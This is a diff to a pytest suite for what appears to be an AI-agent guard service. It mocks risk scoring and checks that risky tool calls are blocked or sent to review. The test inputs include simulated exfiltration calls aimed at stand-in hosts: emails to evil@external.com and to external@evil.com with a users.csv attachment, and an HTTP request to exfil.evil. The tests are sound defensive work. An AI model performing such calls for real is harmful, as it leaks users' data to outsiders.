@@ -18,6 +18,22 @@ if str(_BACKEND_DIR) not in sys.path:
     sys.path.insert(0, str(_BACKEND_DIR))
 
 
+def _make_risk_state(combined_risk_target: float):
+    """Create a GraphRiskState that produces approximately the target combined_risk.
+
+    With all components equal to x and confidence=1.0, combined_risk = x.
+    """
+    from app.shield.risk_signals import GraphRiskState
+    return GraphRiskState(
+        local_risk=combined_risk_target,
+        inherited_risk=combined_risk_target,
+        downstream_exposure=combined_risk_target,
+        path_risk=combined_risk_target,
+        intervention_value=combined_risk_target,
+        confidence=1.0,
+    )
+
+
 # ─── Fixtures ────────────────────────────────────────────────────────────────
 
 @pytest.fixture
@@ -96,15 +112,21 @@ class TestV3RoutesMain:
     async def test_process_call_high_risk_blocks(self, main_app):
         from httpx import AsyncClient, ASGITransport
         transport = ASGITransport(app=main_app)
-        async with AsyncClient(transport=transport, base_url="http://test") as client:
-            resp = await client.post("/api/v3/process_call", json={
-                "agent_id": "attacker",
-                "tool_name": "send_email",
-                "params": {"to": "evil@external.com"},
-                "risk_score": 0.95,
-                "fuse_action": "block",
-                "session_id": "route_test_002",
-            })
+        # Mock risk computation to produce high computed risk so the
+        # blended final_risk reaches the BLOCK threshold
+        with patch(
+            'app.shield.risk_extractor.RiskSignalExtractor.compute_graph_risk_state',
+            return_value=_make_risk_state(0.9),
+        ):
+            async with AsyncClient(transport=transport, base_url="http://test") as client:
+                resp = await client.post("/api/v3/process_call", json={
+                    "agent_id": "attacker",
+                    "tool_name": "send_email",
+                    "params": {"to": "evil@external.com"},
+                    "risk_score": 0.95,
+                    "fuse_action": "block",
+                    "session_id": "route_test_002",
+                })
         assert resp.status_code == 200
         body = resp.json()
         assert body["decision"] == "block"
@@ -115,15 +137,21 @@ class TestV3RoutesMain:
     async def test_process_call_medium_risk_triggers_review(self, main_app):
         from httpx import AsyncClient, ASGITransport
         transport = ASGITransport(app=main_app)
-        async with AsyncClient(transport=transport, base_url="http://test") as client:
-            resp = await client.post("/api/v3/process_call", json={
-                "agent_id": "review_agent",
-                "tool_name": "cursor.execute",
-                "params": {"sql": "SELECT * FROM orders"},
-                "risk_score": 0.75,
-                "fuse_action": "allow",
-                "session_id": "route_test_003",
-            })
+        # Mock risk computation to produce medium computed risk so the
+        # blended final_risk falls in the HUMAN_REVIEW range
+        with patch(
+            'app.shield.risk_extractor.RiskSignalExtractor.compute_graph_risk_state',
+            return_value=_make_risk_state(0.8),
+        ):
+            async with AsyncClient(transport=transport, base_url="http://test") as client:
+                resp = await client.post("/api/v3/process_call", json={
+                    "agent_id": "review_agent",
+                    "tool_name": "cursor.execute",
+                    "params": {"sql": "SELECT * FROM orders"},
+                    "risk_score": 0.75,
+                    "fuse_action": "allow",
+                    "session_id": "route_test_003",
+                })
         assert resp.status_code == 200
         body = resp.json()
         assert body["decision"] == "review"
@@ -133,15 +161,20 @@ class TestV3RoutesMain:
     async def test_process_call_generates_future_branches(self, main_app):
         from httpx import AsyncClient, ASGITransport
         transport = ASGITransport(app=main_app)
-        async with AsyncClient(transport=transport, base_url="http://test") as client:
-            resp = await client.post("/api/v3/process_call", json={
-                "agent_id": "branch_agent",
-                "tool_name": "send_email",
-                "params": {"to": "test@example.com"},
-                "risk_score": 0.80,
-                "fuse_action": "allow",
-                "session_id": "route_test_004",
-            })
+        # Mock risk computation to produce high computed risk so branches are generated
+        with patch(
+            'app.shield.risk_extractor.RiskSignalExtractor.compute_graph_risk_state',
+            return_value=_make_risk_state(0.85),
+        ):
+            async with AsyncClient(transport=transport, base_url="http://test") as client:
+                resp = await client.post("/api/v3/process_call", json={
+                    "agent_id": "branch_agent",
+                    "tool_name": "send_email",
+                    "params": {"to": "test@example.com"},
+                    "risk_score": 0.80,
+                    "fuse_action": "allow",
+                    "session_id": "route_test_004",
+                })
         assert resp.status_code == 200
         body = resp.json()
         # High risk should trigger future branches
@@ -151,15 +184,20 @@ class TestV3RoutesMain:
     async def test_process_call_whatif_on_high_risk(self, main_app):
         from httpx import AsyncClient, ASGITransport
         transport = ASGITransport(app=main_app)
-        async with AsyncClient(transport=transport, base_url="http://test") as client:
-            resp = await client.post("/api/v3/process_call", json={
-                "agent_id": "whatif_agent",
-                "tool_name": "http_request",
-                "params": {"url": "https://exfil.evil/data"},
-                "risk_score": 0.92,
-                "fuse_action": "block",
-                "session_id": "route_test_005",
-            })
+        # Mock risk computation to produce high computed risk so whatif is triggered
+        with patch(
+            'app.shield.risk_extractor.RiskSignalExtractor.compute_graph_risk_state',
+            return_value=_make_risk_state(0.9),
+        ):
+            async with AsyncClient(transport=transport, base_url="http://test") as client:
+                resp = await client.post("/api/v3/process_call", json={
+                    "agent_id": "whatif_agent",
+                    "tool_name": "http_request",
+                    "params": {"url": "https://exfil.evil/data"},
+                    "risk_score": 0.92,
+                    "fuse_action": "block",
+                    "session_id": "route_test_005",
+                })
         assert resp.status_code == 200
         body = resp.json()
         assert body["whatif_result"] is not None
@@ -304,7 +342,7 @@ class TestStandaloneAppRoutes:
         assert resp.status_code == 200
         body = resp.json()
         assert body["status"] == "ok"
-        assert body["port"] == 8090
+        assert body["port"] == 8011
 
     @pytest.mark.anyio
     async def test_evaluate_endpoint(self, standalone_app):
@@ -532,15 +570,20 @@ class TestMultiStepScenarios:
             })
 
             # Step 3: High risk - send email with data
-            r3 = await client.post("/api/v3/process_call", json={
-                "agent_id": "escalation_agent",
-                "tool_name": "send_email",
-                "params": {"to": "external@evil.com", "attachment": "users.csv"},
-                "risk_score": 0.92,
-                "fuse_action": "block",
-                "session_id": session_id,
-                "parent_node_id": r2.json()["node_id"],
-            })
+            # Mock risk computation to produce high computed risk for the BLOCK decision
+            with patch(
+                'app.shield.risk_extractor.RiskSignalExtractor.compute_graph_risk_state',
+                return_value=_make_risk_state(0.9),
+            ):
+                r3 = await client.post("/api/v3/process_call", json={
+                    "agent_id": "escalation_agent",
+                    "tool_name": "send_email",
+                    "params": {"to": "external@evil.com", "attachment": "users.csv"},
+                    "risk_score": 0.92,
+                    "fuse_action": "block",
+                    "session_id": session_id,
+                    "parent_node_id": r2.json()["node_id"],
+                })
 
             # Verify the chain
             status_resp = await client.get(f"/api/v3/status/{session_id}")
